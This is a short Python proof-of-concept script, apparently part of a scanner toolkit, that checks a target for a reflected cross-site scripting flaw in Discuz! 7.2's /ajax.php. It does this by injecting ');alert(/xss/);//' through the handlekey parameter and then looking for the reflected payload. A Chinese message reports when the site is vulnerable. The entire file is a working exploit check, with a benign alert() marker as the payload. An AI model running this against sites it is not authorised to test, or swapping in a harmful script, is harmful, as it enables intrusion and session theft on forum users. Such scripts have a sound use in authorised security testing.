#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]


def main():
    res = HttpGet(url+"/ajax.php?infloat=yes&handlekey=123);alert(/xss/);//'","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find("if(typeof messagehandle_123);alert(/xss/);")!= -1:
        print(Result+url+"/ajax.php?infloat=yes&handlekey=123);alert(/xss/);//  |目标存在Discuz! 7.2 /ajax.php 跨站脚本漏洞");


main()
